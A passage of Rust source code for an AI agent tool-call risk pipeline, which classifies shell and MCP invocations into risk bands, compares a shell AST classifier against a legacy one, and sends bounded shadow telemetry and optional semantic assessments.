    mut receiver: mpsc::Receiver<SemanticAssessmentJob>,
    receipts: mpsc::Sender<SemanticAssessmentReceipt>,
    provider: SemanticProviderConfig,
) -> tokio::task::JoinHandle<()> {
    tokio::spawn(async move {
        let client = reqwest::Client::builder()
            .timeout(provider.timeout)
            .build()
            .expect("semantic provider HTTP client must build");
        while let Some(job) = receiver.recv().await {
            let receipt = match assess_with_provider(&client, &provider, &job.request).await {
                Ok(vector) => SemanticAssessmentReceipt {
                    tool: job.request.tool_name.clone(),
                    status: SemanticAssessorStatus::Assessed,
                    vector: Some(vector),
                    state_intent: job.request.state_intent.clone(),
                },
                Err(status) => semantic_receipt(&job.request, status),
            };
            if let Some(response) = job.response {
                let _ = response.send(receipt.clone());
            }
            let _ = try_emit_semantic_receipt(&receipts, receipt);
        }
    })
}

/// The receipt channel is telemetry only. Saturation drops the newest receipt
/// immediately and never makes a pre-tool invocation wait.
fn try_emit_semantic_receipt(
    receipts: &mpsc::Sender<SemanticAssessmentReceipt>,
    receipt: SemanticAssessmentReceipt,
) -> bool {
    match receipts.try_send(receipt) {
        Ok(()) => true,
        Err(error) => {
            let dropped = error.into_inner();
            tracing::warn!(
                tool = dropped.tool,
                semantic_status = ?dropped.status,
                "dropping bounded semantic risk shadow receipt"
            );
            false
        }
    }
}

/// Evaluate a semantic request without exposing its result to authorization.
/// A future worker owns queueing and timeout policy; this pure seam lets that
/// worker report disabled, unavailable, timeout, malformed, or queue-full
/// outcomes in one bounded receipt.
pub fn evaluate_semantic<A: SemanticAssessor>(
    _tool: &str,
    request: &SemanticAssessmentRequest,
    assessor: Option<&A>,
) -> SemanticAssessmentReceipt {
    match assessor {
        None => SemanticAssessmentReceipt {
            tool: request.tool_name.clone(),
            status: SemanticAssessorStatus::Disabled,
            vector: None,
            state_intent: request.state_intent.clone(),
        },
        Some(assessor) => match assessor.assess(request) {
            Ok(vector) => SemanticAssessmentReceipt {
                tool: request.tool_name.clone(),
                status: SemanticAssessorStatus::Assessed,
                vector: Some(vector),
                state_intent: request.state_intent.clone(),
            },
            Err(status) => SemanticAssessmentReceipt {
                tool: request.tool_name.clone(),
                status,
                vector: None,
                state_intent: request.state_intent.clone(),
            },
        },
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ShadowAssessment {
    pub risk: RiskBand,
    pub exposure: ExposureBand,
    pub source: &'static str,
    /// Workflow intent is context for calibration only; it never changes the
    /// deterministic authorization decision in this shadow-only milestone.
    pub state_intent: Option<String>,
    invocation_fingerprint: Option<String>,
    required_capability: Option<&'static str>,
    semantic_request: Option<SemanticAssessmentRequest>,
    ast_semantic_request: Option<SemanticAssessmentRequest>,
}

/// The bounded record emitted by the shadow path.  It deliberately has no
/// argument, command, path, or payload field.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ShadowReceipt {
    pub tool: String,
    pub risk: RiskBand,
    pub exposure: ExposureBand,
    pub source: &'static str,
    pub state_intent: Option<String>,
}

/// Privacy-bounded comparison between the authoritative string classifier and
/// the non-authoritative Bash AST shadow. No invocation values are retained.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ShellAstShadowReceipt {
    pub status: ParseStatus,
    pub executable_nodes: usize,
    pub shell_heredocs: usize,
    pub foreign_code_heredocs: usize,
    pub opaque_heredocs: usize,
    pub legacy_risk: RiskBand,
    pub legacy_exposure: ExposureBand,
    pub ast_risk: RiskBand,
    pub ast_exposure: ExposureBand,
    pub disagrees: bool,
    pub ast_is_stricter: bool,
}

#[cfg(test)]
thread_local! {
    static TEST_SHADOW_ENABLED: Cell<Option<bool>> = const { Cell::new(None) };
    static TEST_SHADOW_RECEIPTS: RefCell<Vec<ShadowReceipt>> = const { RefCell::new(Vec::new()) };
    static TEST_SEMANTIC_RECEIPTS: RefCell<Vec<SemanticAssessmentReceipt>> = const { RefCell::new(Vec::new()) };
    static TEST_SHELL_AST_SHADOW_ENABLED: Cell<Option<bool>> = const { Cell::new(None) };
    static TEST_SHELL_AST_AUTHORITY_ENABLED: Cell<Option<bool>> = const { Cell::new(None) };
    static TEST_SHELL_AST_RECEIPTS: RefCell<Vec<ShellAstShadowReceipt>> = const { RefCell::new(Vec::new()) };
}

#[cfg(test)]
pub fn set_test_shadow_enabled(enabled: Option<bool>) {
    TEST_SHADOW_ENABLED.with(|value| value.set(enabled));
}

#[cfg(test)]
pub fn take_test_shadow_receipts() -> Vec<ShadowReceipt> {
    TEST_SHADOW_RECEIPTS.with(|receipts| std::mem::take(&mut *receipts.borrow_mut()))
}

#[cfg(test)]
pub fn take_test_semantic_receipts() -> Vec<SemanticAssessmentReceipt> {
    TEST_SEMANTIC_RECEIPTS.with(|receipts| std::mem::take(&mut *receipts.borrow_mut()))
}

#[cfg(test)]
pub fn set_test_shell_ast_shadow_enabled(enabled: Option<bool>) {
    TEST_SHELL_AST_SHADOW_ENABLED.with(|value| value.set(enabled));
}

#[cfg(test)]
pub fn set_test_shell_ast_authority_enabled(enabled: Option<bool>) {
    TEST_SHELL_AST_AUTHORITY_ENABLED.with(|value| value.set(enabled));
}

#[cfg(test)]
pub fn take_test_shell_ast_receipts() -> Vec<ShellAstShadowReceipt> {
    TEST_SHELL_AST_RECEIPTS.with(|receipts| std::mem::take(&mut *receipts.borrow_mut()))
}

/// The global evaluator is inert unless a staging deployment opts in. This
/// keeps the kernel reusable without adding production telemetry by default.
pub fn shadow_enabled_for(value: Option<&str>) -> bool {
    matches!(
        value,
        Some("1") | Some("true") | Some("TRUE") | Some("yes") | Some("YES")
    )
}

/// Emit a bounded receipt only when the deployment has explicitly opted in.
/// The boolean is intentionally returned for ingress tests and health metrics;
/// it says nothing about authorization, which remains deterministic.
pub fn emit_shadow(tool: &str, assessment: &ShadowAssessment) -> bool {
    let enabled = shadow_enabled_for(
        std::env::var("STATEWRIGHT_SHADOW_RISK_ASSESSMENT")
            .ok()
            .as_deref(),
    );
    #[cfg(test)]
    let enabled =
        TEST_SHADOW_ENABLED.with(|override_value| override_value.get().unwrap_or(enabled));
    emit_shadow_when(enabled, tool, assessment)
}

fn emit_shadow_when(enabled: bool, tool: &str, assessment: &ShadowAssessment) -> bool {
    if enabled {
        #[cfg(test)]
        TEST_SHADOW_RECEIPTS.with(|receipts| {
            receipts.borrow_mut().push(ShadowReceipt {
                tool: tool.to_string(),
                risk: assessment.risk,
                exposure: assessment.exposure,
                source: assessment.source,
                state_intent: assessment.state_intent.clone(),
            })
        });
        tracing::info!(
            tool,
            risk = ?assessment.risk,
            exposure = ?assessment.exposure,
            source = assessment.source,
            state_intent = ?assessment.state_intent,
            "statewright pre-tool shadow assessment"
        );
        true
    } else {
        false
    }
}

/// Process-wide staging runtime. It exists only for an explicitly configured
/// staging provider; requests are bounded by the queue and provider timeout.
struct SemanticShadowRuntime {
    queue: SemanticAssessmentQueue,
}

static SEMANTIC_SHADOW_RUNTIME: OnceLock<SemanticShadowRuntime> = OnceLock::new();

fn semantic_receipt(
    request: &SemanticAssessmentRequest,
    status: SemanticAssessorStatus,
) -> SemanticAssessmentReceipt {
    SemanticAssessmentReceipt {
        tool: request.tool_name.clone(),
        status,
        vector: None,
        state_intent: request.state_intent.clone(),
    }
}

fn record_semantic_receipt(receipt: SemanticAssessmentReceipt) {
    #[cfg(test)]
    TEST_SEMANTIC_RECEIPTS.with(|receipts| receipts.borrow_mut().push(receipt.clone()));
    tracing::info!(
        tool = receipt.tool,
        semantic_status = ?receipt.status,
        state_intent = ?receipt.state_intent,
        assessed = receipt.vector.is_some(),
        "statewright semantic risk shadow receipt"
    );
}

fn start_semantic_shadow_runtime(
    config: &SemanticShadowConfig,
    receipts: mpsc::Sender<SemanticAssessmentReceipt>,
    provider: SemanticProviderConfig,
) -> SemanticShadowRuntime {
    let (queue, receiver) = SemanticAssessmentQueue::new(config.queue_capacity);
    spawn_semantic_worker(receiver, receipts, provider);
    SemanticShadowRuntime { queue }
}

fn start_shared_semantic_shadow_runtime(
    config: &SemanticShadowConfig,
    provider: SemanticProviderConfig,
) -> SemanticShadowRuntime {
    let (receipt_sender, mut receipt_receiver) = mpsc::channel(config.queue_capacity);
    let runtime = start_semantic_shadow_runtime(config, receipt_sender, provider);
    tokio::spawn(async move {
        while let Some(receipt) = receipt_receiver.recv().await {
            record_semantic_receipt(receipt);
        }
    });
    runtime
}

/// The common staging dispatcher. A queued request returns no immediate
/// receipt because its worker owns the eventual unavailable result.
fn dispatch_semantic_shadow(
    config: &SemanticShadowConfig,
    runtime: Option<&SemanticShadowRuntime>,
    request: &SemanticAssessmentRequest,
) -> Option<SemanticAssessmentReceipt> {
    if !config.enabled {
        return Some(semantic_receipt(request, SemanticAssessorStatus::Disabled));
    }
    let Some(runtime) = runtime else {
        return Some(semantic_receipt(
            request,
            SemanticAssessorStatus::Unavailable,
        ));
    };
    runtime
        .queue
        .try_submit(request.clone())
        .err()
        .map(|status| semantic_receipt(request, status))
}

/// Submit the redacted operation shape through the staging provider worker.
/// The returned status is the exact immediate outcome: successful enqueue is
/// `Queued`; the later assessed, timeout, malformed, or unavailable receipt is
/// recorded by the worker without delaying authorization.
fn submit_semantic_pipeline(request: &SemanticAssessmentRequest) -> SemanticAssessmentReceipt {
    let config = SemanticShadowConfig::from_env();
    let provider = SemanticProviderConfig::from_env();
    let runtime =
        if config.enabled && provider.is_some() && tokio::runtime::Handle::try_current().is_ok() {
            Some(SEMANTIC_SHADOW_RUNTIME.get_or_init(|| {
                start_shared_semantic_shadow_runtime(&config, provider.expect("provider checked"))
            }))
        } else {
            None
        };
    submit_semantic_pipeline_with(&config, runtime, request)
}

async fn submit_semantic_pipeline_visible_with(
    config: &SemanticShadowConfig,
    runtime: Option<&SemanticShadowRuntime>,
    timeout: std::time::Duration,
    request: &SemanticAssessmentRequest,
) -> SemanticAssessmentReceipt {
    if !config.enabled {
        return semantic_receipt(request, SemanticAssessorStatus::Disabled);
    }
    let Some(runtime) = runtime else {
        return semantic_receipt(request, SemanticAssessorStatus::Unavailable);
    };
    let receiver = match runtime.queue.try_submit_with_response(request.clone()) {
        Ok(receiver) => receiver,
        Err(status) => return semantic_receipt(request, status),
    };
    match tokio::time::timeout(timeout, receiver).await {
        Ok(Ok(receipt)) => receipt,
        Ok(Err(_)) => semantic_receipt(request, SemanticAssessorStatus::Unavailable),
        Err(_) => semantic_receipt(request, SemanticAssessorStatus::Timeout),
    }
}

fn submit_semantic_pipeline_with(
    config: &SemanticShadowConfig,
    runtime: Option<&SemanticShadowRuntime>,
    request: &SemanticAssessmentRequest,
) -> SemanticAssessmentReceipt {
    let receipt = dispatch_semantic_shadow(config, runtime, request)
        .unwrap_or_else(|| semantic_receipt(request, SemanticAssessorStatus::Queued));
    record_semantic_receipt(receipt.clone());
    receipt
}

pub fn assess_shell(command: &str) -> ShadowAssessment {
    let classes = bash_classifier::classify(command);
    if classes.contains(&OpClass::Destructive) {
        return assessment(RiskBand::Critical, ExposureBand::Local, "shell");
    }
    if classes.contains(&OpClass::Network) || classes.contains(&OpClass::GitWrite) {
        return assessment(RiskBand::High, ExposureBand::External, "shell");
    }
    // The read-only proof is stricter than the broad operation classifier and
    // rejects redirects, expansions, and path-qualified lookalikes.
    if bash_classifier::readonly_capabilities(command).is_some() {
        return assessment(RiskBand::Low, ExposureBand::Local, "shell");
    }
    let required_capability = local_effect_capability(&classes);
    // A proven local effect cannot erase another segment whose effect remains
    // unclassified. Known harmless stdout commands use SafeOutput instead.
    if classes
        .iter()
        .any(|class| matches!(class, OpClass::Opaque | OpClass::Passthrough))
    {
        return required_capability.map_or_else(
            || assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell"),
            |capability| {
                assessment_with_capability(
                    RiskBand::Moderate,
                    ExposureBand::Unknown,
                    "shell",
                    capability,
                )
            },
        );
    }
    if let Some(capability) = required_capability {
        return assessment_with_capability(
            RiskBand::Moderate,
            ExposureBand::Local,
            "shell",
            capability,
        );
    }
    assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell")
}

/// Reduce independently classified local effects to an explicit capability
/// union. Read-only companions do not change the union; no local effect can
/// erase another merely because it appeared later in a compound command.
fn local_effect_capability(classes: &[OpClass]) -> Option<&'static str> {
    let has_write = classes.iter().any(|class| {
        matches!(
            class,
            OpClass::FileWrite | OpClass::FileModify | OpClass::LocalWrite
        )
    });
    let has_bounded_execution = classes.contains(&OpClass::BoundedLocalExecution);
    let has_git_local_write = classes.contains(&OpClass::GitLocalWrite);
    match (has_write, has_bounded_execution, has_git_local_write) {
        (false, false, false) => None,
        (true, false, false) => Some("Write"),
        (false, true, false) => Some("BoundedLocalExecution"),
        (false, false, true) => Some("GitLocalWrite"),
        (true, true, false) => Some("Write+BoundedLocalExecution"),
        (true, false, true) => Some("Write+GitLocalWrite"),
        (false, true, true) => Some("BoundedLocalExecution+GitLocalWrite"),
        (true, true, true) => Some("Write+BoundedLocalExecution+GitLocalWrite"),
    }
}

fn shell_ast_shadow_enabled() -> bool {
    let enabled = shadow_enabled_for(
        std::env::var("STATEWRIGHT_SHELL_AST_SHADOW")
            .ok()
            .as_deref(),
    );
    #[cfg(test)]
    let enabled = TEST_SHELL_AST_SHADOW_ENABLED
        .with(|override_value| override_value.get().unwrap_or(enabled));
    enabled
}

fn shell_ast_authority_enabled() -> bool {
    let enabled = shadow_enabled_for(
        std::env::var("STATEWRIGHT_SHELL_AST_AUTHORITY")
            .ok()
            .as_deref(),
    );
    #[cfg(test)]
    let enabled = TEST_SHELL_AST_AUTHORITY_ENABLED
        .with(|override_value| override_value.get().unwrap_or(enabled));
    enabled
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ShellAstMode {
    Disabled,
    Shadow,
    Authority,
}

fn shell_ast_mode() -> ShellAstMode {
    if shell_ast_authority_enabled() {
        ShellAstMode::Authority
    } else if shell_ast_shadow_enabled() {
        ShellAstMode::Shadow
    } else {
        ShellAstMode::Disabled
    }
}

fn assess_shell_ast(ast: &AstShadowAssessment) -> ShadowAssessment {
    let classes = &ast.classes;
    if classes.contains(&OpClass::Destructive) {
        return assessment(RiskBand::Critical, ExposureBand::Local, "shell_ast");
    }
    if classes.contains(&OpClass::Network) || classes.contains(&OpClass::GitWrite) {
        return assessment(RiskBand::High, ExposureBand::External, "shell_ast");
    }
    let required_capability = local_effect_capability(classes);
    let opaque_is_covered_foreign_wrapper = foreign_wrapper_is_fully_classified(ast);
    if (classes.contains(&OpClass::Opaque) || classes.contains(&OpClass::Passthrough))
        && !opaque_is_covered_foreign_wrapper
    {
        return required_capability.map_or_else(
            || assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell_ast"),
            |capability| {
                assessment_with_capability(
                    RiskBand::Moderate,
                    ExposureBand::Unknown,
                    "shell_ast",
                    capability,
                )
            },
        );
    }
    if let Some(capability) = required_capability {
        return assessment_with_capability(
            RiskBand::Moderate,
            ExposureBand::Local,
            "shell_ast",
            capability,
        );
    }
    if classes.iter().all(|class| {
        matches!(
            class,
            OpClass::FileRead
                | OpClass::ContentSearch
                | OpClass::FileSearch
                | OpClass::GitRead
                | OpClass::SafeOutput
        ) || (opaque_is_covered_foreign_wrapper
            && matches!(class, OpClass::Opaque | OpClass::Passthrough))
    }) {
        return assessment(RiskBand::Low, ExposureBand::Local, "shell_ast");
    }
    assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell_ast")
}

fn foreign_wrapper_is_fully_classified(ast: &AstShadowAssessment) -> bool {
    ast.status == ParseStatus::Parsed
        && ast.foreign_code_units > 0
        && ast.executable_nodes == ast.foreign_code_units
        && ast.foreign_code_units == ast.foreign_code_units_with_complete_effect_evidence
        && ast.opaque_heredocs == 0
}

fn exposure_rank(exposure: ExposureBand) -> u8 {
    match exposure {
        ExposureBand::Local => 0,
        ExposureBand::Unknown => 1,
        ExposureBand::External => 2,
        ExposureBand::Account => 3,
    }
}

/// Select the structured assessment only when it is complete and cannot erase
/// a known effect. A fully parsed local read or explicit local capability union
/// may replace a legacy Moderate/Unknown result caused by compound shell
/// syntax; unresolved leaves remain Unknown and cannot take this path.
fn ast_authority_wins(
    legacy: &ShadowAssessment,
    ast: &ShadowAssessment,
    status: ParseStatus,
) -> bool {
    if status != ParseStatus::Parsed {
        return false;
    }
    let legacy_rank = risk_rank(legacy.risk);
    let ast_rank = risk_rank(ast.risk);
    if ast_rank > legacy_rank {
        return true;
    }
    if ast_rank == legacy_rank {
        return exposure_rank(ast.exposure) >= exposure_rank(legacy.exposure);
    }
    legacy.risk == RiskBand::Moderate
        && legacy.exposure == ExposureBand::Unknown
        && ast.risk == RiskBand::Low
        && ast.exposure == ExposureBand::Local
}

fn apply_shell_ast_authority(
    mut legacy: ShadowAssessment,
    ast: &AstShadowAssessment,
    ast_request: SemanticAssessmentRequest,
) -> ShadowAssessment {
    let mut structured = assess_shell_ast(ast);
    structured.state_intent = legacy.state_intent.clone();
    structured.invocation_fingerprint = legacy.invocation_fingerprint.clone();
    structured.semantic_request = Some(ast_request.clone());
    let complete_structural_local_effect = legacy.risk == RiskBand::Moderate
        && legacy.exposure == ExposureBand::Unknown
        && structured.risk == RiskBand::Moderate
        && structured.exposure == ExposureBand::Local
        && structured.required_capability.is_some()
        && ast.status == ParseStatus::Parsed;
    if ast_authority_wins(&legacy, &structured, ast.status) || complete_structural_local_effect {
        structured
    } else {
        // Preserve comparison telemetry when an incomplete or weaker AST
        // result correctly falls back to the legacy decision.
        legacy.ast_semantic_request = Some(ast_request);
        legacy
    }
}

fn emit_shell_ast_comparison(legacy: &ShadowAssessment, ast: &AstShadowAssessment) {
    let ast_assessment = assess_shell_ast(ast);
    let receipt = ShellAstShadowReceipt {
        status: ast.status,
        executable_nodes: ast.executable_nodes,
        shell_heredocs: ast.shell_heredocs,
        foreign_code_heredocs: ast.foreign_code_heredocs,
        opaque_heredocs: ast.opaque_heredocs,
        legacy_risk: legacy.risk,
        legacy_exposure: legacy.exposure,
        ast_risk: ast_assessment.risk,
        ast_exposure: ast_assessment.exposure,
        disagrees: legacy.risk != ast_assessment.risk || legacy.exposure != ast_assessment.exposure,
        ast_is_stricter: risk_rank(ast_assessment.risk) > risk_rank(legacy.risk),
    };
    #[cfg(test)]
    TEST_SHELL_AST_RECEIPTS.with(|receipts| receipts.borrow_mut().push(receipt.clone()));
    tracing::info!(
        parse_status = ?receipt.status,
        executable_nodes = receipt.executable_nodes,
        shell_heredocs = receipt.shell_heredocs,
        foreign_code_heredocs = receipt.foreign_code_heredocs,
        opaque_heredocs = receipt.opaque_heredocs,
        legacy_risk = ?receipt.legacy_risk,
        legacy_exposure = ?receipt.legacy_exposure,
        ast_risk = ?receipt.ast_risk,
        ast_exposure = ?receipt.ast_exposure,
        disagrees = receipt.disagrees,
        ast_is_stricter = receipt.ast_is_stricter,
        "statewright shell AST shadow comparison"
    );
}

/// Produce exactly one deterministic assessment for an actual invocation.
/// Shell commands are classified from their command text; all other calls use
/// registered MCP metadata plus the conservative name fallback.
pub fn assess_invocation(
    tool: Option<&ToolInfo>,
    tool_name: &str,
    arguments: &serde_json::Value,
    state_intent: Option<&str>,
) -> ShadowAssessment {
    assess_invocation_with_origin(tool, tool_name, arguments, state_intent, false)
}

fn assess_invocation_with_origin(
    tool: Option<&ToolInfo>,
    tool_name: &str,
    arguments: &serde_json::Value,
    state_intent: Option<&str>,
    trusted_native_adapter: bool,
) -> ShadowAssessment {
    let is_shell = matches!(
        tool_name.to_ascii_lowercase().as_str(),
        "bash" | "shell" | "terminal" | "exec_command" | "run_command"
    );
    let shell_command = is_shell
        .then(|| {
            arguments
                .get("command")
                .or_else(|| arguments.get("cmd"))
                .and_then(|value| value.as_str())
        })
        .flatten();
    let known_native_write = !is_shell
        && trusted_native_adapter
        && tool.is_none()
        && native_tool_family(tool_name) == Some(NativeToolFamily::Write);
    let mut result = if is_shell {
        shell_command
            .map(assess_shell)
            .unwrap_or_else(|| assess_mcp(tool, tool_name))
    } else {
        let base = if known_native_write {
            assessment(RiskBand::Moderate, ExposureBand::Local, "native_write")
        } else {
            assess_mcp(tool, tool_name)
        };
        let shape = mcp_shape(tool, tool_name, arguments);
        // Invocation-level effects can raise risk, never erase a known risk.
        if known_native_write || matches!(base.risk, RiskBand::High | RiskBand::Critical) {
            base
        } else {
            match shape.selector_intent {
                Some(McpOperationIntent::Destructive | McpOperationIntent::ExternalWrite) => {
                    assessment(RiskBand::High, ExposureBand::Account, "mcp_selector")
                }
                Some(McpOperationIntent::Write) => {
                    assessment(RiskBand::Moderate, ExposureBand::Unknown, "mcp_selector")
                }
                _ if shape.delegates_unknown_effect => assessment(
                    RiskBand::Moderate,
                    ExposureBand::Unknown,
                    "mcp_opaque_payload",
                ),
                _ => base,
            }
        }
    };
    result.invocation_fingerprint = Some(invocation_fingerprint(tool_name, arguments));
    result.state_intent = state_intent.map(str::to_owned);
    let semantic_request = semantic_request(tool, tool_name, arguments, state_intent, is_shell);
    result.semantic_request = Some(semantic_request.clone());
    let ast_mode = shell_ast_mode();
    if ast_mode != ShellAstMode::Disabled {
        if let Some(command) = shell_command {
            let ast = shell_ast_shadow::assess(command);
            emit_shell_ast_comparison(&result, &ast);
            let ast_request = shell_ast_semantic_request(&semantic_request, &ast, ast_mode);
            match ast_mode {
                ShellAstMode::Authority => {
                    result = apply_shell_ast_authority(result, &ast, ast_request)
                }
                ShellAstMode::Shadow => result.ast_semantic_request = Some(ast_request),
                ShellAstMode::Disabled => unreachable!(),
            }
        }
    }
    result
}

/// Run the pre-tool assessment pipeline with the staging provider posture.
/// A provider must be explicitly configured in an opted-in staging deployment;
/// otherwise the semantic branch is visibly `Unavailable` and cannot make a
/// deterministic decision less restrictive.
pub fn assess_pipeline(
    tool: Option<&ToolInfo>,
    tool_name: &str,
    arguments: &serde_json::Value,
    state_intent: Option<&str>,
) -> RiskPipelineAssessment {
    let config = SemanticShadowConfig::from_env();
    let deterministic = assess_invocation(tool, tool_name, arguments, state_intent);
    emit_shadow(tool_name, &deterministic);
    let semantic = deterministic
        .semantic_request
        .as_ref()
        .map(submit_semantic_pipeline)
        .unwrap_or(SemanticAssessmentReceipt {
            tool: "unknown".to_owned(),
            status: SemanticAssessorStatus::Malformed,
            vector: None,
            state_intent: None,
        });
    if let Some(request) = deterministic.ast_semantic_request.as_ref() {
        let _ = submit_semantic_pipeline(request);
    }
    pipeline_from_parts(deterministic, semantic, config.authoritative_enabled)
}

/// Async visible form for hook and adapter responses. It waits only for the
/// configured bounded provider window. Callers may consume an assessed vector
/// only when the pipeline carries explicit authorization provenance.
pub async fn assess_pipeline_visible(
    tool: Option<&ToolInfo>,
    tool_name: &str,
    arguments: &serde_json::Value,
    state_intent: Option<&str>,
) -> RiskPipelineAssessment {
    let config = SemanticShadowConfig::from_env();
    let provider = SemanticProviderConfig::from_env();
    let runtime =
        if config.enabled && provider.is_some() && tokio::runtime::Handle::try_current().is_ok() {
            Some(SEMANTIC_SHADOW_RUNTIME.get_or_init(|| {
                start_shared_semantic_shadow_runtime(
                    &config,
                    provider.clone().expect("provider checked"),
                )
            }))
        } else {
            None
        };
    assess_pipeline_visible_with_runtime(
        tool,
        tool_name,
        arguments,
        state_intent,
        false,
        &config,
        runtime,
        provider
            .map(|provider| provider.timeout)
            .unwrap_or_default(),
    )
    .await
}

/// Assess a call arriving through the trusted Codex/Claude native-tool
/// adapter. This provenance is what permits canonical filesystem Write tools
/// to remain local when no upstream registration exists. A registered MCP tool
/// with a colliding name retains its metadata-derived remote/unknown posture.
pub async fn assess_native_pipeline_visible(
    tool: Option<&ToolInfo>,
    tool_name: &str,
    arguments: &serde_json::Value,
    state_intent: Option<&str>,
) -> RiskPipelineAssessment {
    let config = SemanticShadowConfig::from_env();
    let provider = SemanticProviderConfig::from_env();
    let runtime =
        if config.enabled && provider.is_some() && tokio::runtime::Handle::try_current().is_ok() {
            Some(SEMANTIC_SHADOW_RUNTIME.get_or_init(|| {
                start_shared_semantic_shadow_runtime(
                    &config,
                    provider.clone().expect("provider checked"),
                )
            }))
        } else {
            None
        };
    assess_pipeline_visible_with_runtime(
        tool,
        tool_name,
        arguments,
        state_intent,
        true,
        &config,
        runtime,
        provider
            .map(|provider| provider.timeout)
            .unwrap_or_default(),
    )
    .await
}

async fn assess_pipeline_visible_with_runtime(
    tool: Option<&ToolInfo>,
    tool_name: &str,
    arguments: &serde_json::Value,
    state_intent: Option<&str>,
    trusted_native_adapter: bool,
    config: &SemanticShadowConfig,
    runtime: Option<&SemanticShadowRuntime>,
    timeout: std::time::Duration,
) -> RiskPipelineAssessment {
    let deterministic = assess_invocation_with_origin(
        tool,
        tool_name,
        arguments,
        state_intent,
        trusted_native_adapter,
    );
    emit_shadow(tool_name, &deterministic);
    let semantic = match deterministic.semantic_request.as_ref() {
        Some(request) => {
            submit_semantic_pipeline_visible_with(config, runtime, timeout, request).await
        }
        None => SemanticAssessmentReceipt {
            tool: "unknown".to_owned(),
            status: SemanticAssessorStatus::Malformed,
            vector: None,
            state_intent: None,
        },
    };
    if let Some(request) = deterministic.ast_semantic_request.as_ref() {
        let _ = submit_semantic_pipeline_with(config, runtime, request);
    }
    pipeline_from_parts(deterministic, semantic, config.authoritative_enabled)
}

/// Provider-injected form used by a future calibrated worker and focused
/// tests.  The combination policy is monotonic: semantic inference may only
/// raise the deterministic risk floor.
pub fn assess_pipeline_with<A: SemanticAssessor>(
    tool: Option<&ToolInfo>,
    tool_name: &str,
    arguments: &serde_json::Value,
    state_intent: Option<&str>,
    assessor: Option<&A>,
) -> RiskPipelineAssessment {
    assess_pipeline_with_config(
        tool,
        tool_name,
        arguments,
        state_intent,
        assessor,
        &SemanticShadowConfig::from_env(),
    )
}

fn assess_pipeline_with_config<A: SemanticAssessor>(
    tool: Option<&ToolInfo>,
    tool_name: &str,
    arguments: &serde_json::Value,
    state_intent: Option<&str>,
    assessor: Option<&A>,
    config: &SemanticShadowConfig,
) -> RiskPipelineAssessment {
    let deterministic = assess_invocation(tool, tool_name, arguments, state_intent);
    let semantic = match deterministic.semantic_request.as_ref() {
        None => SemanticAssessmentReceipt {
            tool: "unknown".to_owned(),
            status: SemanticAssessorStatus::Malformed,
            vector: None,
            state_intent: None,
        },
        Some(request) if !config.enabled => {
            semantic_receipt(request, SemanticAssessorStatus::Disabled)
        }
        Some(request) => match assessor {
            Some(assessor) => evaluate_semantic(tool_name, request, Some(assessor)),
            None => semantic_receipt(request, SemanticAssessorStatus::Unavailable),
        },
    };
    pipeline_from_parts(deterministic, semantic, config.authoritative_enabled)
}

fn pipeline_from_parts(
    deterministic: ShadowAssessment,
    semantic: SemanticAssessmentReceipt,
    semantic_authorization_enabled: bool,
) -> RiskPipelineAssessment {
    // System One is an opaque-effect fallthrough, not an override for effects
    // already proven by code. Keep deterministic reads, local writes, and
    // known high-risk operations authoritative; semantic inference may only
    // raise the floor of a Moderate/Unknown assessment.
    let effective_risk = if deterministic.risk == RiskBand::Moderate
        && deterministic.exposure == ExposureBand::Unknown
    {
        semantic_failsafe_floor(deterministic.risk, &semantic)
    } else {
        deterministic.risk
    };
    let semantic_failsafe_escalated = effective_risk != deterministic.risk;
    RiskPipelineAssessment {
        deterministic,
        semantic,
        effective_risk,
        semantic_failsafe_escalated,
        semantic_authorization_enabled,
    }
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct LocalCommandEvidence {
    schema: String,
    tool_name: String,
    command: String,
    requested_cwd: Option<String>,
    cwd: Option<String>,
    invocation: bash_classifier::LiteralInvocation,
    collected_at_ms: i64,
    complete: bool,
    commands: Vec<LocalCommandUnit>,
    files: Vec<LocalCommandFile>,
    reason: Option<String>,
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct LocalCommandUnit {
    original: String,
    resolved: String,
    cwd: String,
    invocation: Option<bash_classifier::LiteralInvocation>,
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct LocalCommandFile {
    path: String,
    sha256: String,
}

/// Only the native adapter invokes this boundary. Evidence is generated from
/// current local bytes by the managed hook, not from model-authored tool input.
/// As with GitLocalWrite, the local account/plugin is trusted, not attested
/// against malicious same-user tampering. Never expose these bytes to System One.
pub fn apply_native_command_evidence(
    pipeline: RiskPipelineAssessment,
    registered_tool: Option<&ToolInfo>,
    tool_name: &str,
    arguments: &serde_json::Value,
    evidence: Option<&serde_json::Value>,
) -> RiskPipelineAssessment {
    let Some(evidence) = evidence.filter(|value| !value.is_null()) else {
        return pipeline;
    };
    if registered_tool.is_some()
        || native_tool_family(tool_name) != Some(NativeToolFamily::Command)
        || matches!(
            pipeline.deterministic.risk,
            RiskBand::High | RiskBand::Critical
        )
    {
        return pipeline;
    }
    let command = arguments
        .get("command")
        .or_else(|| arguments.get("cmd"))
        .and_then(|v| v.as_str());
    let Some(command) = command else {
        return pipeline;
    };
    let Some(invocation) = bash_classifier::literal_invocation(command) else {
        return pipeline;
    };
    let supported_root = match (invocation.executable.as_str(), invocation.args.as_slice()) {
        ("task", [target]) => !target.starts_with('-'),
        ("task", [flag, directory, target]) if matches!(flag.as_str(), "-d" | "--dir") => {
            !directory.is_empty() && !target.starts_with('-')
        }
        ("task", [flag, target]) if flag.starts_with("--dir=") => {
            flag.len() > "--dir=".len() && !target.starts_with('-')
        }
        ("npm" | "pnpm", [op]) => op == "test",
        ("npm" | "pnpm", [op, name]) => op == "run" && !name.starts_with('-'),
        ("npx", [runner, op, ..]) => runner == "vitest" && op == "run",
        ("vitest", [op, ..]) => op == "run",
        ("node", _) => bash_classifier::bounded_node_repository_entrypoint(&invocation).is_some(),
        _ => false,
    };
    if !supported_root {
        return pipeline;
    }
    let mut deterministic = pipeline.deterministic;
    let incomplete = |mut value: ShadowAssessment| {
        value.risk = RiskBand::Moderate;
        value.exposure = ExposureBand::Unknown;
